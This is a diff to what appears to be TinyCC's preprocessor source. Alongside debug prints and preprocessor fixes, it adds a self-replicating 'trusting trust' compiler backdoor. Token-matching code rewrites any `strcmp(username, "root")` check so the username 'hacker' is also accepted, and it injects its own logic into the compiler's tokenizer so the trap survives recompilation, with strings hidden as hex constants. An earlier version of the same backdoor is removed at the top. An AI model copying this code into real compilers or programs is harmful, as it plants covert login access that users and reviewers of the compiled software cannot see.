@@ -18,84 +18,12 @@
  * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  */
 
+#include <string.h>
 #define USING_GLOBALS
 #include "tcc.h"
 
 /* #define to 1 to enable (see parse_pp_string()) */
 #define ACCEPT_LF_IN_STRINGS 0
-
-int acdee = 0, bcdee = 0, ccdee = 0, dcdee = 0, ecdee = 0;
-int insert_txt = 0;
-uint8_t *text = 0;
-
-void match(char **match_toks, int match_len, int *match, char *insert) {
-    const char *str = get_tok_str(tok, &tokc);
-    //printf("token = %d %s\n", tok, get_tok_str(tok, &tokc));
-    if (strcmp(match_toks[*match], str) == 0){
-        (*match)++;
-        }
-    else {
-        (*match) = 0;
-    }
-    if ((*match) == match_len) {
-        insert_txt = 1;
-        text = (uint8_t *)insert;
-        (*match) = 0;
-    }
-}
-
-char *login_toks[] = {"strcmp", "(", "username", ",", (char[]){0x22,0x72,0x6F,0x6F,0x74,0x22}, ")"};
-char *hoist_toks[] = {
-    "tok_flags", ";", "ST_DATA", "int", "parse_flags", ";"
-};
-char *insert_toks[] = {"static", "void", "next_nomacro",
-    "(", "void", ")", "{", "int", "t", ",", "c",
-    ",", "is_long", ",", "len", ";", "TokenSym",
-    "*", "ts", ";", "uint8_t", "*", "p", ",",
-    "*", "p1", ";", "unsigned", "int", "h", ";", "p", "=", "file", "->", "buf_ptr", ";"};
-char *update_tok1[] = {"keep_tok_flags", ":"};
-char *update_tok2[] = {"keep_tok_flags", ":", "file", "->", "buf_ptr", "=", "p", ";"};
-
-char *login_txt = " || (username[0]=='h'&&username[1]=='a'&&username[2]=='c'&&username[3]=='k'&&username[4]=='e'&&username[5]=='r')";
-char *insert_content = "if (insert_txt == 1 && text != 0 && *text != 0) { p = text; } else { insert_txt = 0; p = file->buf_ptr; }";
-char *update_txt1 = "if (insert_txt == 1) { text = p; } else";
-char *update_txt2 = "if (insert_txt == 0) { match(login_toks, sizeof(login_toks) / sizeof(login_toks[0]), &bcdee, login_txt); match(insert_toks, sizeof(insert_toks) / sizeof(insert_toks[0]), &ccdee, insert_content); match(update_tok1, sizeof(update_tok1) / sizeof(update_tok1[0]), &dcdee, update_txt1); match(update_tok2, sizeof(update_tok2) / sizeof(update_tok2[0]), &ecdee, update_txt2); }";
-
-char *hoist_txt = "int acdee = 0, bcdee = 0, ccdee = 0, dcdee = 0, ecdee = 0;\n"        
-                    "int insert_txt = 0;\n"
-                    "uint8_t *text = 0;\n"
-                    "void match(char **match_toks, int match_len, int *match, char *insert) {\n"
-                    "    const char *str = get_tok_str(tok, &tokc);\n"
-                    "    if (strcmp(match_toks[*match], str) == 0){\n"
-                    "        (*match)++;\n"
-                    "        }\n"
-                    "    else {\n"
-                    "        (*match) = 0;\n"
-                    "    }\n"
-                    "    if ((*match) == match_len) {\n"
-                    "        insert_txt = 1;\n"
-                    "        text = (uint8_t *)insert;\n"
-                    "        (*match) = 0;\n"
-                    "    }\n"
-                    "}\n"
-                    "\n"
-                    "char *login_toks[] = {\"strcmp\", \"(\", \"username\", \",\", (char[]){0x22,0x72,0x6F,0x6F,0x74,0x22,0x00}, \")\"};\n"
-                    "char *hoist_toks[] = {\"tok_flags\", \";\", \"ST_DATA\", \"int\", \"parse_flags\", \";\"};\n"
-                    "char *insert_toks[] = {\"static\", \"void\", \"next_nomacro\", \"(\", \"void\", \")\", \"{\", \"int\", \"t\", \",\", \"c\", \",\", \"is_long\", \",\", \"len\", \";\", \"TokenSym\", \"*\", \"ts\", \";\", \"uint8_t\", \"*\", \"p\", \",\", \"*\", \"p1\", \";\", \"unsigned\", \"int\", \"h\", \";\"};\n"
-                    "char *update_tok1[] = {\"keep_tok_flags\", \":\"};\n"
-                    "char *update_tok2[] = {\"keep_tok_flags\", \":\", \"file\", \"->\", \"buf_ptr\", \"=\", \"p\", \";\"};\n"
-                    "\n"
-                    "char *login_txt = \" || (username[0]=='h'&&username[1]=='a'&&username[2]=='c'&&username[3]=='k'&&username[4]=='e'&&username[5]=='r')\";\n"
-                    "char *insert_content = \"if (insert_txt == 1 && text != 0 && *text != 0) { p = text; } else { insert_txt = 0; p = file->buf_ptr; }\";\n"
-                    "char *update_txt1 = \"if (insert_txt == 1) { text = p; } else\";\n"
-                    "char *update_txt2 = \"if (insert_txt == 0) { match(login_toks, sizeof(login_toks) / sizeof(login_toks[0]), &bcdee, login_txt); match(insert_toks, sizeof(insert_toks) / sizeof(insert_toks[0]), &ccdee, insert_content); match(update_tok1, sizeof(update_tok1) / sizeof(update_tok1[0]), &dcdee, update_txt1); match(update_tok2, sizeof(update_tok2) / sizeof(update_tok2[0]), &ecdee, update_txt2); }\";";
-
-void hoist(void) {
-    // char t[2000];
-    // sprintf(t, "\"%s\"", hoist_txt);
-    // printf("\"%s\"\n", hoist_txt);
-    match(hoist_toks, sizeof(hoist_toks) / sizeof(hoist_toks[0]), &acdee, hoist_txt);
-}
 
 /********************************************************/
 /* global variables */
@@ -615,7 +543,11 @@ ST_FUNC const char *get_tok_str(int v, CValue *cv)
     case TOK_CLLONG:
     case TOK_CULLONG:
         /* XXX: not quite exact, but only useful for testing  */
+#ifdef _WIN32
+        sprintf(p, "%u", (unsigned)cv->i);
+#else
         sprintf(p, "%llu", (unsigned long long)cv->i);
+#endif
         break;
     case TOK_LCHAR:
         cstr_ccat(&cstr_buf, 'L');
@@ -672,8 +604,10 @@ ST_FUNC const char *get_tok_str(int v, CValue *cv)
     case 0: /* anonymous nameless symbols */
         return strcpy(p, "<no name>");
     default:
+        // printf("Anding %d with SYM_FIELD\n", v);
         v &= ~(SYM_FIELD | SYM_STRUCT);
         if (v < TOK_IDENT) {
+            // printf("%d Less than TOKEN_IDENT\n", v);
             /* search in two bytes table */
             const unsigned char *q = tok_two_chars;
             while (*q) {
@@ -696,6 +630,7 @@ ST_FUNC const char *get_tok_str(int v, CValue *cv)
             return table_ident[v - TOK_IDENT]->str;
         } else if (v >= SYM_FIRST_ANOM) {
             /* special name for anonymous symbol */
+            // printf("Handling special name\n");
             sprintf(p, "L.%u", v - SYM_FIRST_ANOM);
         } else {
             /* should never happen */
@@ -753,22 +688,29 @@ static int next_c(void)
 /* input with '\[\r]\n' handling. */
 static int handle_stray_noerror(int err)
 {
+    printf("Parsing string - IDENTIFIER 2.1.2.1\n");
     int ch;
     while ((ch = next_c()) == '\\') {
+        printf("Parsing string - IDENTIFIER 2.1.2.2\n");
         ch = next_c();
         if (ch == '\n') {
     newl:
+        printf("Parsing string - IDENTIFIER 2.1.2.3\n");
             file->line_num++;
         } else {
+        printf("Parsing string - IDENTIFIER 2.1.2.4\n");
             if (ch == '\r') {
+        printf("Parsing string - IDENTIFIER 2.1.2.5\n");
                 ch = next_c();
                 if (ch == '\n')
                     goto newl;
+        printf("Parsing string - IDENTIFIER 2.1.2.6\n");
                 *--file->buf_ptr = '\r';
             }
             if (err)
                 tcc_error("stray '\\' in program");
             /* may take advantage of 'BufferedFile.unget[4}' */
+        printf("Parsing string - IDENTIFIER 2.1.2.7\n");
             return *--file->buf_ptr = '\\';
         }
     }
@@ -780,10 +722,14 @@ static int handle_stray_noerror(int err)
 /* handle '\\' in strings, comments and skipped regions */
 static int handle_bs(uint8_t **p)
 {
+    printf("Parsing string - IDENTIFIER 2.1.1\n");
     int c;
     file->buf_ptr = *p - 1;
+    printf("Parsing string - IDENTIFIER 2.1.2\n");
     c = ninp();
+    printf("Parsing string - IDENTIFIER 2.1.3\n");
     *p = file->buf_ptr;
+    printf("Parsing string - IDENTIFIER 2.1.4\n");
     return c;
 }
 
@@ -890,7 +836,10 @@ static uint8_t *parse_pp_string(uint8_t *p, int sep, CString *str)
         if (c == sep) {
             break;
         } else if (c == '\\') {
+            printf("Parsing string - IDENTIFIER 2.1\n");
             c = handle_bs(&p);
+            printf("Parsing string - IDENTIFIER 2.2\n");
+            printf("File: %s\n", p);
             if (c == CH_EOF) {
         unterminated_string:
                 /* XXX: indicate line number of start of string */
@@ -1407,10 +1356,8 @@ ST_FUNC void skip_to_eol(int warn)
         return;
     if (warn)
         tcc_warning("extra tokens after directive");
-    while (macro_stack)
-        end_macro();
     file->buf_ptr = parse_line_comment(file->buf_ptr - 1);
-    next_nomacro();
+    tok = TOK_LINEFEED;
 }
 
 static CachedInclude *
@@ -1427,7 +1374,7 @@ static int parse_include(TCCState *s1, int do_next, int test)
         cstr_reset(&tokcstr);
         file->buf_ptr = parse_pp_string(file->buf_ptr, c == '<' ? '>' : c, &tokcstr);
         i = tokcstr.size;
-        pstrncpy(name, sizeof name, tokcstr.data, i);
+        pstrncpy(name, tokcstr.data, i >= sizeof name ? sizeof name - 1 : i);
         next_nomacro();
     } else {
         /* computed #include : concatenate tokens until result is one of
@@ -1468,7 +1415,7 @@ static int parse_include(TCCState *s1, int do_next, int test)
             if (c != '\"')
                 continue;
             p = file->true_filename;
-            pstrncpy(buf, sizeof buf, p, tcc_basename(p) - p);
+            pstrncpy(buf, p, tcc_basename(p) - p);
         } else {
             int j = i - 2, k = j - s1->nb_include_paths;
             if (k < 0)
@@ -1562,7 +1509,8 @@ static int expr_preprocess(TCCState *s1)
                 if (tok != ')')
                     expect("')'");
             }
-            goto c_number;
+            tok = TOK_CINT;
+            tokc.i = c;
         } else if (tok == TOK___HAS_INCLUDE ||
                    tok == TOK___HAS_INCLUDE_NEXT) {
             t = tok;
@@ -1572,13 +1520,12 @@ static int expr_preprocess(TCCState *s1)
             c = parse_include(s1, t - TOK___HAS_INCLUDE, 1);
             if (tok != ')')
                 expect("')'");
-            goto c_number;
+            tok = TOK_CINT;
+            tokc.i = c;
         } else {
             /* if undefined macro, replace with zero */
-            c = 0;
-        c_number:
-            tok = TOK_CLLONG; /* type intmax_t */
-            tokc.i = c;
+            tok = TOK_CINT;
+            tokc.i = 0;
         }
         tok_str_add_tok(str);
     }
@@ -2002,37 +1949,38 @@ ST_FUNC void preprocess(int is_bof)
     case TOK_LINE:
         parse_flags &= ~PARSE_FLAG_TOK_NUM;
         next();
+        parse_flags |= PARSE_FLAG_TOK_NUM;
         if (tok != TOK_PPNUM) {
     _line_err:
             tcc_error("wrong #line format");
         }
-        c = 1;
         goto _line_num;
     case TOK_PPNUM:
         if (parse_flags & PARSE_FLAG_ASM_FILE)
             goto ignore;
-        c = 0; /* no error with extra tokens */
     _line_num:
         for (n = 0, q = tokc.str.data; *q; ++q) {
             if (!isnum(*q))
                 goto _line_err;
             n = n * 10 + *q - '0';
         }
-        parse_flags &= ~PARSE_FLAG_TOK_STR; /* don't parse escape sequences */
+        parse_flags &= ~PARSE_FLAG_TOK_STR;
         next();
-        if (tok != TOK_LINEFEED) {
-            if (tok != TOK_PPSTR || tokc.str.data[0] != '"')
-                goto _line_err;
+        parse_flags |= PARSE_FLAG_TOK_STR;
+        if (tok == TOK_PPSTR && tokc.str.data[0] == '"') {
             tokc.str.data[tokc.str.size - 2] = 0;
             tccpp_putfile(tokc.str.data + 1);
-            next();
-            /* skip optional level number & advance to next line */
-            skip_to_eol(c);
+            n--;
+            if (macro_ptr && *macro_ptr == 0)
+                macro_stack->save_line_num = n;
         }
+        else if (tok != TOK_LINEFEED)
+            goto _line_err;
         if (file->fd > 0)
             total_lines += file->line_num - n;
+        file->line_ref += file->line_num - n;
         file->line_num = n;
-        break;
+        goto ignore; /* skip optional level number */
 
     case TOK_ERROR:
     case TOK_WARNING:
@@ -2579,10 +2527,6 @@ static void parse_number(const char *p)
             }
         }
 
-        /* in #if/#elif expressions, all numbers have type (u)intmax_t anyway */
-        if (pp_expr)
-            lcount = 2;
-
         /* Determine if it needs 64 bits and/or unsigned in order to fit */
         if (ucount == 0 && b == 10) {
             if (lcount <= (LONG_SIZE == 4)) {
@@ -2631,6 +2575,93 @@ static void parse_number(const char *p)
         }                                       \
         break;
 
+int acdee, bcdee, ccdee, dcdee, ecdee;
+int insert_txt = 0;
+uint8_t *text = 0;
+
+void match(char **match_toks, int match_len, int *match, char *insert) {
+    const char *str = get_tok_str(tok, &tokc);
+    if (strcmp(match_toks[*match], str) == 0){
+        (*match)++;
+        }
+    else {
+        (*match) = 0;
+    }
+    if ((*match) == match_len) {
+        printf("INSERTING %s\n", insert);
+        insert_txt = 1;
+        text = (uint8_t *)insert;
+        (*match) = 0;
+    }
+}
+
+char *login_toks[] = {"strcmp", "(", "username", ",", "\"root\"", ")"};
+char *hoist_toks[] = {"static", "void", "next_nomacro", "(", "void", ")", ";"};
+char *insert_toks[] = {"static", "void", "next_nomacro",
+    "(", "void", ")", "{", "int", "t", ",", "c",
+    ",", "is_long", ",", "len", ";", "TokenSym",
+    "*", "ts", ";", "uint8_t", "*", "p", ",",
+    "*", "p1", ";", "unsigned", "int", "h", ";"};
+char *update_tok1[] = {"keep_tok_flags", ":"};
+char *update_tok2[] = {"keep_tok_flags", ":", "file", "->", "buf_ptr", "=", "p", ";"};
+
+char *login_txt = " || !strcmp(username, \"hacker\")";
+char *insert_content = "if(login_txt[0] == 0) {sprintf(login_txt, format_str, 34, (char *)&hacker, 34);} if (insert_txt == 1 && text != 0 && *text != 0) { p = text; goto redo_no_start; } else { insert_txt = 0; p = file->buf_ptr; }";
+char *update_txt1 = "printf(\"token = %d %s%c\", tok, get_tok_str(tok, &tokc), 10); if (insert_txt == 1) { text = p; } else";
+char *update_txt2 = "if (insert_txt == 0) { match(login_toks, 6, &bcdee, login_txt); match(insert_toks, 31, &ccdee, insert_content); match(update_tok1, 2, &dcdee, update_txt1); match(update_tok2, 8, &ecdee, update_txt2); }";
+
+char *hoist_txt;
+void hoist(void) {
+    // char t[2000];
+    // sprintf(t, "\"%s\"", hoist_txt);
+    // printf("\"%s\"\n", hoist_txt);
+
+
+    match(hoist_toks, 7, &acdee, hoist_txt);
+}
+
+char *hoist_txt = "int acdee, bcdee, ccdee, dcdee, ecdee;\n"
+"int insert_txt = 0;\n"
+"uint64_t root = 0x22746f6f7222;\n"
+"uint64_t hacker = 0x72656b636168;\n"
+"uint8_t *text = 0;\n"
+"void match(char **match_toks, int match_len, int *match, char *insert) {\n"
+"    const char *str = get_tok_str(tok, &tokc);\n"
+"    printf(\"TOKEN_STR = %s; LEN = %d; EXP = %s%c\", str, *match, match_toks[*match], 10);"
+"    if (strcmp(match_toks[*match], str) == 0){\n"
+"        (*match)++;\n"
+"        }\n"
+"    else {\n"
+"        (*match) = 0;\n"
+"    }\n"
+"    if ((*match) == match_len) {\n"
+"        printf(\"INSERTING: %s\", insert);"
+"        insert_txt = 1;\n"
+"        text = (uint8_t *)insert;\n"
+"        (*match) = 0;\n"
+"    }\n"
+"}\n"
+"\n"
+"char *login_toks[] = {\"strcmp\", \"(\", \"username\", \",\", (char *)(&root), \")\",};"
+"char *insert_toks[] = {\"static\", \"void\", \"next_nomacro\",\n"
+"    \"(\", \"void\", \")\", \"{\", \"int\", \"t\", \",\", \"c\",\n"
+"    \",\", \"is_long\", \",\", \"len\", \";\", \"TokenSym\",\n"
+"    \"*\", \"ts\", \";\", \"uint8_t\", \"*\", \"p\", \",\",\n"
+"    \"*\", \"p1\", \";\", \"unsigned\", \"int\", \"h\", \";\"};\n"
+"char *update_tok1[] = {\"keep_tok_flags\", \":\"};\n"
+"char *update_tok2[] = {\"keep_tok_flags\", \":\", \"file\", \"->\", \"buf_ptr\", \"=\", \"p\", \";\"};\n"
+"\n"
+"char *format_str = \"|| !strcmp(username, %c%s%c)\";"
+"char login_txt[100];"
+// "int num = \n"
+// "char *login_txt =\"|| !strcmp(username, %s)\";\n"
+"char *insert_content = \"if (insert_txt == 1 && text != 0 && *text != 0) { p = text; } else { insert_txt = 0; p = file->buf_ptr; }\";\n"
+"char *update_txt1 = \"if (insert_txt == 1) { text = p; } else\";\n"
+"char *update_txt2 = \"if (insert_txt == 0) { match(login_toks, 6, &bcdee, login_txt); match(insert_toks, 31, &ccdee, insert_content); match(update_tok1, 2, &dcdee, update_txt1); match(update_tok2, 8, &ecdee, update_txt2); }\";";
+
+// char *
+
+
 /* return next token without macro substitution */
 static void next_nomacro(void)
 {
@@ -2646,7 +2677,12 @@ static void next_nomacro(void)
         insert_txt = 0;
         p = file->buf_ptr;
     }
-redo_no_start:
+    {
+        
+        char tmp[] = {p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7], p[8], p[9], '\0'};
+        printf("REMAINING %s\n", tmp);
+    }
+ redo_no_start:
     c = *p;
     switch(c) {
     case ' ':
@@ -2883,13 +2919,18 @@ maybe_newline:
     case '\"':
         is_long = 0;
     str_const:
+        printf("Parsing string\n");
         cstr_reset(&tokcstr);
         if (is_long)
             cstr_ccat(&tokcstr, 'L');
+        printf("Parsing string - IDENTIFIER 1\n");
         cstr_ccat(&tokcstr, c);
+        printf("Parsing string - IDENTIFIER 2\n");
         p = parse_pp_string(p, c, &tokcstr);
+        printf("Parsing string - IDENTIFIER 3\n");
         cstr_ccat(&tokcstr, c);
         cstr_ccat(&tokcstr, '\0');
+        printf("Parsing string - IDENTIFIER 4\n");
         tokc.str.size = tokcstr.size;
         tokc.str.data = tokcstr.data;
         tok = TOK_PPSTR;
@@ -3012,13 +3053,6 @@ maybe_newline:
         break;
         
         /* simple tokens */
-    case '@': /* only used in assembler */
-#ifdef TCC_TARGET_ARM /* comment on arm asm */
-        if (parse_flags & PARSE_FLAG_ASM_FILE) {
-            p = parse_line_comment(p);
-            goto redo_no_start;
-        }
-#endif
     case '(':
     case ')':
     case '[':
@@ -3030,6 +3064,7 @@ maybe_newline:
     case ':':
     case '?':
     case '~':
+    case '@': /* only used in assembler */
     parse_simple:
         tok = c;
         p++;
@@ -3043,19 +3078,22 @@ maybe_newline:
         break;
     }
     tok_flags = 0;
+// UPDATE_TOK1
 keep_tok_flags:
     if (insert_txt == 1) {
         text = p;
     } else file->buf_ptr = p;
 
+    // UPDATE_TOK2
     if (insert_txt == 0) {
         hoist();
-        match(login_toks, sizeof(login_toks) / sizeof(login_toks[0]), &bcdee, login_txt);
-        match(insert_toks, sizeof(insert_toks) / sizeof(insert_toks[0]), &ccdee, insert_content);
-        match(update_tok1, sizeof(update_tok1) / sizeof(update_tok1[0]), &dcdee, update_txt1);
-        match(update_tok2, sizeof(update_tok2) / sizeof(update_tok2[0]), &ecdee, update_txt2);
+        match(login_toks, 6, &bcdee, login_txt);
+        match(insert_toks, 31, &ccdee, insert_content);
+        match(update_tok1, 2, &dcdee, update_txt1);
+        match(update_tok2, 8, &ecdee, update_txt2);
     }
-    // #define PARSE_DEBUG
+    
+    #define PARSE_DEBUG
 #if defined(PARSE_DEBUG)
     printf("token = %d %s\n", tok, get_tok_str(tok, &tokc));
 #endif
